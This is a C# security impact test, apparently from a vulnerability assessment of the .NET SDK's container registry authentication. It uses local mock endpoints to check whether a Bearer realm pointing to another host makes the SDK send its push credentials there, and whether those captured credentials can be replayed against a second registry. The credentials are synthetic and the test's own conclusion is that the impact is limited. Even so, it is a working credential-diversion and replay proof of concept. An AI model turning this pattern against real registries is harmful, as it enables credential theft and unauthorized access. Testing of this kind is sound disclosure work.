// Independent mock registry impact test. Evaluates *conditional* credential reuse in another trust domain,
// and tests whether the untrusted originating registry could obtain the same credentials via normal Basic auth.
using System.Collections.Concurrent;
using System.Reflection;
using System.Runtime.Loader;
using System.Text;
using System.Text.Json;
using System.Net;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging.Abstractions;

static class IndependentImpactLab
{
    const string CredentialUser="SYNTH_ORIGIN_REGISTRY_USER";
    const string CredentialPass="SYNTH_ORIGIN_REGISTRY_SHARED_CREDENTIAL";
    const string SeparateUser="SYNTH_OTHER_REGISTRY_ONLY";
    const string SeparatePass="SYNTH_SEPARATE_REGISTRY_SECRET";
    const string Token="SYNTH_BEARER_FROM_DIVERSION";
    const string Media="application/vnd.oci.image.manifest.v1+json";
    static readonly string Sdk=Environment.GetEnvironmentVariable("SDK_VER")??"unknown";
    static readonly List<object> Results=[];
    static string Basic(string u,string p)=>"Basic "+Convert.ToBase64String(Encoding.ASCII.GetBytes(u+":"+p));
    static object NewApi(Assembly asm,string authority)
    {
        var typ=asm.GetType("Microsoft.NET.Build.Containers.DefaultRegistryAPI",true)!;
        var mode=Enum.Parse(asm.GetType("Microsoft.NET.Build.Containers.RegistryMode",true)!,"Push");
        return Activator.CreateInstance(typ,BindingFlags.Instance|BindingFlags.Public|BindingFlags.NonPublic,null,
            [authority,new Uri("https://"+authority+"/"),false,NullLogger.Instance,mode],null)!;
    }
    static async Task<bool> Fetch(Assembly asm,string authority,string repository)
    {
        try{
            var api=NewApi(asm,authority);
            var op=api.GetType().GetProperty("Manifest")!.GetValue(api)!;
            var m=op.GetType().GetMethod("GetAsync")!;
            var obj=m.Invoke(op,[repository,"latest",CancellationToken.None])!;
            // Avoid generic Task invariance: await Task then retrieve the Result via reflection.
            var task=(Task)obj;
            await task;
            var result=task.GetType().GetProperty("Result")?.GetValue(task);
            if(result is HttpResponseMessage response){using(response)return response.IsSuccessStatusCode;}
            return result!=null;
        }catch{return false;}
    }
    public static async Task RunAsync()
    {
        var keys=new[]{"DOTNET_CONTAINER_PUSH_REGISTRY_UNAME","DOTNET_CONTAINER_PUSH_REGISTRY_PWORD",
            "DOTNET_CONTAINER_REGISTRY_UNAME","DOTNET_CONTAINER_REGISTRY_PWORD"};
        var save=keys.ToDictionary(x=>x,x=>Environment.GetEnvironmentVariable(x));
        IWebProxy proxy=HttpClient.DefaultProxy;
        HttpClient.DefaultProxy=new WebProxy();
        bool success=false;
        try{success=await Run();}
        finally{
            HttpClient.DefaultProxy=proxy;
            foreach(var kv in save)Environment.SetEnvironmentVariable(kv.Key,kv.Value);
            Directory.CreateDirectory("REPRODUCTION-EVIDENCE");
            File.WriteAllText("REPRODUCTION-EVIDENCE/sdk-"+Sdk+"-independent-impact.json",
                JsonSerializer.Serialize(new{sdk=Sdk,tests=Results},new JsonSerializerOptions{WriteIndented=true}));
        }
        if(!success)throw new Exception("Independent-registry conditional impact assertions failed");
    }
    static async Task<bool> Run()
    {
        string assemblyPath=Environment.GetEnvironmentVariable("DOTNET_SDK_CONTAINER_ASSEMBLY")!;
        var asm=AssemblyLoadContext.Default.LoadFromAssemblyPath(Path.GetFullPath(assemblyPath));
        const string origin="registry.lab.test";
        const string diverted="privateauth.lab.test";
        var tokenHits=new ConcurrentQueue<object>();
        string? capturedBasic=null;
        int receivedBasicAtOrigin=0;
        string validManifest="{\"schemaVersion\":2,\"mediaType\":\""+Media+"\",\"config\":{\"mediaType\":\"application/vnd.oci.image.config.v1+json\",\"size\":2,\"digest\":\"sha256:0000000000000000000000000000000000000000000000000000000000000000\"},\"layers\":[]}";
        await using var collector=await LocalEndpoint.Start("127.0.0.2",async c=>
        {
            string auth=c.Request.Headers.Authorization.ToString();
            if(auth==Basic(CredentialUser,CredentialPass))capturedBasic=auth;
            tokenHits.Enqueue(new{method=c.Request.Method,gotOriginRegistryCredential=auth==Basic(CredentialUser,CredentialPass)});
            c.Response.StatusCode=200;c.Response.ContentType="application/json";
            await c.Response.WriteAsync("{\"token\":\""+Token+"\",\"expires_in\":180}");
        },tls:true);
        string realm="https://"+diverted+":"+collector.Port+"/token";
        await using var registry=await LocalEndpoint.Start("127.0.0.1",async c=>
        {
            string auth=c.Request.Headers.Authorization.ToString();
            if(c.Request.Path.Value?.Contains("/directBasic/",StringComparison.Ordinal)==true)
            {
                if(auth==Basic(CredentialUser,CredentialPass))
                {
                    Interlocked.Increment(ref receivedBasicAtOrigin);
                    c.Response.StatusCode=200;c.Response.ContentType=Media;
                    await c.Response.WriteAsync(validManifest);
                }
                else{c.Response.StatusCode=401;c.Response.Headers.WWWAuthenticate="Basic realm=\"ordinary-registry\"";}
                return;
            }
            if(auth=="Bearer "+Token)
            {
                c.Response.StatusCode=200;c.Response.ContentType=Media;
                await c.Response.WriteAsync(validManifest);
            }
            else{c.Response.StatusCode=401;c.Response.Headers.WWWAuthenticate="Bearer realm=\""+realm+"\",service=\"origin\"";}
        },tls:true);
        var protectedHits=new ConcurrentQueue<object>();
        await using var protectedRegistry=await LocalEndpoint.Start("127.0.0.3",async c=>
        {
            string a=c.Request.Headers.Authorization.ToString();
            bool shared=c.Request.Path.Value?.EndsWith("/shared",StringComparison.Ordinal)==true;
            bool allowed=shared?a==Basic(CredentialUser,CredentialPass):a==Basic(SeparateUser,SeparatePass);
            protectedHits.Enqueue(new{resource=shared?"shared-scope":"isolated-scope",
                accepted=allowed,usingCapturedCredential=a==Basic(CredentialUser,CredentialPass)});
            if(allowed){
                c.Response.StatusCode=200;
                c.Response.ContentType="application/json";
                await c.Response.WriteAsync("{\"protected\":\"synthetic-independent-registry\"}");
            }
            else c.Response.StatusCode=403;
        },tls:true);

        Environment.SetEnvironmentVariable("DOTNET_CONTAINER_PUSH_REGISTRY_UNAME",CredentialUser);
        Environment.SetEnvironmentVariable("DOTNET_CONTAINER_PUSH_REGISTRY_PWORD",CredentialPass);
        Environment.SetEnvironmentVariable("DOTNET_CONTAINER_REGISTRY_UNAME",null);
        Environment.SetEnvironmentVariable("DOTNET_CONTAINER_REGISTRY_PWORD",null);
        string authority=origin+":"+registry.Port;
        bool authenticatedViaRealm=await Fetch(asm,authority,"proof");
        bool gotCaptured=capturedBasic==Basic(CredentialUser,CredentialPass);
        using var client=new HttpClient(new SocketsHttpHandler{UseProxy=false});
        async Task<int> Read(string path,string authorization)
        {
            using var req=new HttpRequestMessage(HttpMethod.Get,"https://third.lab.test:"+protectedRegistry.Port+path);
            if(authorization.Length>0)req.Headers.TryAddWithoutValidation("Authorization",authorization);
            using var response=await client.SendAsync(req);
            return (int)response.StatusCode;
        }
        int baseline=await Read("/private/shared","");
        int wrong=await Read("/private/shared",Basic("wrong","wrong"));
        int sharedReplay=await Read("/private/shared",capturedBasic??"");
        int isolatedDenied=await Read("/private/isolated",capturedBasic??"");
        int isolatedOwnCredential=await Read("/private/isolated",Basic(SeparateUser,SeparatePass));
        // Separate origin authority avoids static per-registry cache from the Bearer flow.
        bool originCanGetSameCredential=await Fetch(asm,"registry-alt.lab.test:"+registry.Port,"directBasic");
        bool pass=authenticatedViaRealm&&gotCaptured&&
            baseline==403&&wrong==403&&sharedReplay==200&&
            isolatedDenied==403&&isolatedOwnCredential==200&&
            originCanGetSameCredential&&receivedBasicAtOrigin>0;

        var info=new{scenario="independent-registries-credential-scope-conditional-impact",
            passed=pass,sdk=Sdk,
            originRegistryAuthenticatedViaDivertedRealm=authenticatedViaRealm,
            divertedEndpointCapturedSyntheticCredential=gotCaptured,
            unauthenticatedIndependentRegistryReadStatus=baseline,
            incorrectCredentialIndependentRegistryReadStatus=wrong,
            replayAgainstDeliberatelySharedCredentialScopeStatus=sharedReplay,
            replayAgainstDistinctCredentialScopeStatus=isolatedDenied,
            independentCredentialControlStatus=isolatedOwnCredential,
            originatingRegistryObtainsSameCredentialViaOrdinaryBasicChallenge=originCanGetSameCredential,
            originatingRegistryOrdinaryBasicReceivedCredential=receivedBasicAtOrigin>0,
            interpretation="Cross-registry reuse requires overlapping credential scope. Malicious origin registry can request the same origin credentials via ordinary Basic auth; realm diversion does not by itself prove a new independent trust boundary.",
            tokenRequests=tokenHits.ToArray(),protectedRequests=protectedHits.ToArray()
        };
        Results.Add(info);
        Console.WriteLine("[INDEPENDENT "+Sdk+"] "+JsonSerializer.Serialize(info));
        return pass;
    }
}
